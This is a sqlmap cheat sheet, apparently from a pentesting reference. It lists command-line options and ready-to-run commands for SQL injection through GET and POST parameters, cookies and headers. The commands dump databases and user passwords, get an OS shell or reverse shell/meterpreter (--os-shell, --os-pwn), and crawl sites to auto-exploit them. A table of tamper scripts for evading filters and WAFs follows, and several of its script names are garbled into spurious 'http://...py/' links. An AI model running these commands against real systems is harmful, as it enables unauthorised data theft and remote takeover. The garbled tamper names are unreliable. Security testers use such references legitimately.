# Sqlmap

# Basic Arguments for SQLmap

## Generic

```bash
-u "<URL>"
-p "<PARAM TO TEST>"
--user-agent=SQLMAP
--random-agent
--threads=10
--risk=3 #MAX
--level=5 #MAX
--dbms="<KNOWN DB TECH>"
--os="<OS>"
--technique="UB" #Use only techniques UNION and BLIND in that order (default "BEUSTQ")
--batch #Non interactive mode, usually Sqlmap will ask you questions, this accepts the default answers
--auth-type="<AUTH>" #HTTP authentication type (Basic, Digest, NTLM or PKI)
--auth-cred="<AUTH>" #HTTP authentication credentials (name:password)
--proxy=PROXY

```

## Retrieve Information

### Internal

```bash
--current-user #Get current user
--is-dba #Check if current user is Admin
--hostname #Get hostname
--users #Get usernames od DB
--passwords #Get passwords of users in DB

```

### DB Data

```bash
--all #Retrieve everything
--dump #Dump DBMS database table entries
--dbs #Names of the available databases
--tables #Tables of a database ( -D <DB NAME> )
--columns #Columns of a table  ( -D <DB NAME> -T <TABLE NAME> )
-D <DB NAME> -T <TABLE NAME> -C <COLUMN NAME> #Dump column

```

# Injection place

## From Burp/ZAP Capture

Capture the request and create a req.txt file

```bash
sqlmap -r req.txt --current-user

```

## GET Request Injection

```bash
sqlmap -u "<http://example.com/?id=1>" -p id
sqlmap -u "<http://example.com/?id=*>" -p id

```

## POST Request Injection

```bash
sqlmap -u "<http://example.com>" --data "username=*&password=*"

```

## Injections in Headers and other HTTP Methods

```bash
#Inside cookie
sqlmap  -u "<http://example.com>" --cookie "mycookies=*"

#Inside some header
sqlmap -u "<http://example.com>" --headers="x-forwarded-for:127.0.0.1*"
sqlmap -u "<http://example.com>" --headers="referer:*"

#PUT Method
sqlmap --method=PUT -u "<http://example.com>" --headers="referer:*"

#The injection is located at the '*'

```

## Second order Injection

```bash
python sqlmap.py -r /tmp/r.txt --dbms MySQL --second-order "<http://targetapp/wishlist>" -v 3
sqlmap -r 1.txt -dbms MySQL -second-order "http://<IP/domain>/joomla/administrator/index.php" -D "joomla" -dbs

```

## Shell

```bash
#Exec command
python sqlmap.py -u "<http://example.com/?id=1>" -p id --os-cmd whoami

#Simple Shell
python sqlmap.py -u "<http://example.com/?id=1>" -p id --os-shell

#Dropping a reverse-shell / meterpreter
python sqlmap.py -u "<http://example.com/?id=1>" -p id --os-pwn

```

## Crawl a Website with SQLmap and Auto-exploit

```bash
sqlmap -u "<http://example.com/>" --crawl=1 --random-agent --batch --forms --threads=5 --level=5 --risk=3

--batch = non interactive mode, usually Sqlmap will ask you questions, this accepts the default answers
--crawl = how deep you want to crawl a site
--forms = Parse and test forms

```

# Customizing Injection

## Set a Suffix

```bash
python sqlmap.py -u "<http://example.com/?id=1>"  -p id --suffix="-- "

```

## Prefix

```bash
python sqlmap.py -u "<http://example.com/?id=1>"  -p id --prefix="') "

```

## Help Finding Boolean Injection

```bash
# The --not-string "string" will help finding a string that does not appear in True responses (for finding boolean blind injection)
sqlmap -r r.txt -p id --not-string ridiculous --batch

```

## Tamper

```bash
--tamper=name_of_the_tamper
#In kali you can see all the tampers in /usr/share/sqlmap/tamper

```

| Tamper | Description |
| --- | --- |
| <http://apostrophemask.py/> | Replaces apostrophe character with its UTF-8 full width counterpart |
| <http://apostrophenullencode.py/> | Replaces apostrophe character with its illegal double unicode counterpart |
| <http://appendnullbyte.py/> | Appends encoded NULL byte character at the end of payload |
| <http://base64encode.py/> | Base64 all characters in a given payload |
| <http://between.py/> | Replaces greater than operator \('>'\) with 'NOT BETWEEN 0 AND \#' |
| <http://bluecoat.py/> | Replaces space character after SQL statement with a valid random blank character.Afterwards replace character = with LIKE operator |
| <http://chardoubleencode.py/> | Double url-encodes all characters in a given payload \(not processing already encoded\) |
| <http://commalesslimit.py/> | Replaces instances like 'LIMIT M, N' with 'LIMIT N OFFSET M' |
| <http://commalessmid.py/> | Replaces instances like 'MID\(A, B, C\)' with 'MID\(A FROM B FOR C\)' |
| <http://concat2concatws.py/> | Replaces instances like 'CONCAT\(A, B\)' with 'CONCAT\_WS\(MID\(CHAR\(0\), 0, 0\), A, B\)' |
| <http://charencode.py/> | Url-encodes all characters in a given payload \(not processing already encoded\) |
| <http://charunicodeencode.py/> | Unicode-url-encodes non-encoded characters in a given payload \(not processing already encoded\). "%u0022" |
| <http://charunicodeescape.py/> | Unicode-url-encodes non-encoded characters in a given payload \(not processing already encoded\). "\u0022" |
| <http://equaltolike.py/> | Replaces all occurances of operator equal \('='\) with operator 'LIKE' |
| <http://escapequotes.py/> | Slash escape quotes \(' and "\) |
| <http://greatest.py/> | Replaces greater than operator \('>'\) with 'GREATEST' counterpart |
| <http://halfversionedmorekeywords.py/> | Adds versioned MySQL comment before each keyword |
| <http://ifnull2ifisnull.py/> | Replaces instances like 'IFNULL\(A, B\)' with 'IF\(ISNULL\(A\), B, A\)' |
| <http://modsecurityversioned.py/> | Embraces complete query with versioned comment |
| <http://modsecurityzeroversioned.py/> | Embraces complete query with zero-versioned comment |
| <http://multiplespaces.py/> | Adds multiple spaces around SQL keywords |
| <http://nonrecursivereplacement.py/> | Replaces predefined SQL keywords with representations suitable for replacement \(e.g..replace\("SELECT", ""\)\) filters |
| <http://percentage.py/> | Adds a percentage sign \('%'\) infront of each character |
| <http://overlongutf8.py/> | Converts all characters in a given payload \(not processing already encoded\) |
| <http://randomcase.py/> | Replaces each keyword character with random case value |
| <http://randomcomments.py/> | Add random comments to SQL keywords |
| <http://securesphere.py/> | Appends special crafted string |
| sp\_password.py | Appends 'sp\_password' to the end of the payload for automatic obfuscation from DBMS logs |
| <http://space2comment.py/> | Replaces space character \(' '\) with comments |
| <http://space2dash.py/> | Replaces space character \(' '\) with a dash comment \('--'\) followed by a random string and a new line \('\n'\) |
| <http://space2hash.py/> | Replaces space character \(' '\) with a pound character \('\#'\) followed by a random string and a new line \('\n'\) |
| <http://space2morehash.py/> | Replaces space character \(' '\) with a pound character \('\#'\) followed by a random string and a new line \('\n'\) |
| <http://space2mssqlblank.py/> | Replaces space character \(' '\) with a random blank character from a valid set of alternate characters |
| <http://space2mssqlhash.py/> | Replaces space character \(' '\) with a pound character \('\#'\) followed by a new line \('\n'\) |
| <http://space2mysqlblank.py/> | Replaces space character \(' '\) with a random blank character from a valid set of alternate characters |
| <http://space2mysqldash.py/> | Replaces space character \(' '\) with a dash comment \('--'\) followed by a new line \('\n'\) |
| <http://space2plus.py/> | Replaces space character \(' '\) with plus \('+'\) |
| <http://space2randomblank.py/> | Replaces space character \(' '\) with a random blank character from a valid set of alternate characters |
| <http://symboliclogical.py/> | Replaces AND and OR logical operators with their symbolic counterparts \(&& and |
| <http://unionalltounion.py/> | Replaces UNION ALL SELECT with UNION SELECT |
| <http://unmagicquotes.py/> | Replaces quote character \('\) with a multi-byte combo %bf%27 together with generic comment at the end \(to make it work\) |
| <http://uppercase.py/> | Replaces each keyword character with upper case value 'INSERT' |
| <http://varnish.py/> | Append a HTTP header 'X-originating-IP' |
| <http://versionedkeywords.py/> | Encloses each non-function keyword with versioned MySQL comment |
| <http://versionedmorekeywords.py/> | Encloses each keyword with versioned MySQL comment |
| <http://xforwardedfor.py/> | Append a fake HTTP header 'X-Forwarded-For' |
